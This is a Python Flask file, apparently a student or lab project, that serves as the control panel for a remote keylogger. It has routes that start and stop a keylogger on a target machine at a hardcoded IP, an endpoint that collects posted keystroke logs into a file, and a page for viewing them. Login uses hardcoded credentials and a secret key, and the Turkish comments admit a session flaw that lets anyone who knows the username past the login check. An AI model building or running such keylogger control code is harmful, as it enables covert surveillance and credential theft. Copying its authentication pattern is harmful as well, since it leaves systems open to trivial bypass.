from flask import Flask, render_template, request, redirect, url_for, flash, send_from_directory
from markupsafe import escape
from flask import jsonify, session
from flask_session import Session
import requests
import json
import os
# from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)

# SESSION_TYPE = "filesystem"
# # app.config.from_object(__name__)
# Session(app)

""" app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///test.db'
db = SQLAlchemy(app) """

my_username = "sal"
my_password = "123"
app.secret_key = "my_secret_key"
TARGET_MACHINE_IP = "192.168.79.129:5000"

LOG_DIR = 'log_files'



@app.route('/')
def index():
  return redirect(url_for('login'))
  return render_template('index.html')

@app.route('/status')
def status():
  return "Flask is working!"

@app.route('/login', methods=["GET","POST"])
def login():
  error = None
  if request.method == "POST":
    print("📍 Checkpoint 1: Reached login POST block")
    username = request.form.get("username")
    password = request.form.get("password")
    session['username'] = request.form['username']
        
    if valid_login(username, password):
      session['username'] = username
      print("📍Loged in successfully") 
      return redirect(url_for('log_viewer'))
      
    else:
      if username == my_username:
        session['username']
        flash('Invalid username or password')
      return redirect(url_for('login')) #"<h2>Invalid username or password</h2>"
  else:
    print("📍This is GET ")  
    return render_template('login.html')


def valid_login(username, password):
  if username == my_username and password == my_password:
      print("📍 Checkpoint 2: Login credentials match")
      return True
  else:
    return False

def log_the_user_in():pass

@app.route('/log_viewer')
def log_viewer():
    if session.get('username'):# TODO: and session.get('user_id') Burada session ayarlayamadim bunla birlikte log_viewer sayyfasina giremiyorum ama onsuz /log_viewer sayfasina manuel girebiliyorum username'i sadece bilerek
      print("📍 Checkpoint 3: Log Viewer reached")
      return render_template('log_viewer.html')
    else:
      flash('You must be logged in to view logs')
      return redirect(url_for('login'))
    
    """ if 'username' not in session:
      flash('You must be logged in to view logs')
      return redirect(url_for('login'))
    return render_template('log_viewer.html') """

@app.route('/logs/<filename>')
def view_log_file(filename):
  return send_from_directory(LOG_DIR, filename) # Flask's secure way of serving files from a specific folder in your project.

@app.route('/start_keylogger')
def start_keylogger():
  print("📍 Checkpoint 4: Keylogger remote started")
  # requests.get('http://{TARGET_MACHINE_IP}/start_keylogger')
  requests.get('http://192.168.79.129:5000/start_keylogger')
  return redirect(url_for('log_viewer'))

@app.route('/stop_keylogger')
def stop_keylogger():
  print("📍 Checkpoint 5: Keylogger remote stop")
  # requests.get('http://{TARGET_MACHINE_IP}/stop_keylogger')
  requests.get('http://192.168.79.129:5000/stop_keylogger')
  return redirect(url_for('log_viewer'))

@app.route('/receive_logs', methods=['POST'])
def receive_logs():
    data = request.get_json()
    log_entry = data.get('log')
    #SAve to file or database
    with open('received_logs.txt', 'a') as f:
        f.write(log_entry + '\n')
    return jsonify({"status": "success"})


@app.route('/logout')
def logout():
    session.pop('username', None)
    flash('You have been logged out')
    return redirect(url_for('login'))

# Username dogru olup sifre ilk basta yanlis oldugundan "You must be logged in to view logs" diyor fakat ikinci defa defa da 
#log_viewers sayfsina girmeye calistiginda an "You must be logged in to view logs" diyor. 
#Log in yapmaya calistiginda dogru username ama yanlis sifre giriyorsan "Invalid username or password" diyor. Fakat burada bir problem var
#Session sadece username gore baktigindan girmeye calistiginda session kaydoldugundan log_viewers sayfasina girmeye calistiginda girebiliyorsun bu bir acik